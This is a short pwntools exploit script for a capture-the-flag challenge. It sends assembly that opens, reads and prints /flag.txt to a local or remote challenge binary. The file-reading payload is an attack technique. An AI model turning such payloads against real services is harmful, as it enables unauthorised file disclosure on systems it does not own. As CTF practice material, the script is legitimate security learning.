#!/usr/bin/python3
from pwn import *
import sys
FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

payload = """mov rax, 2
lea rdi, [rel path]
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
mov rax, 0
lea rsi, [rel buf]
mov rdx, 64
syscall
mov rax, 1
mov rdi, 1
lea rsi, [rel buf]
mov rdx, 64
syscall
mov rax, 60
xor rdi, rdi
syscall
path: db "/flag.txt", 0
buf:  times 64 db 0
END"""

r.recvuntil(b"Hint: syscalls use rax, rdi, rsi, rdx.\n")
r.sendline(payload)

r.interactive()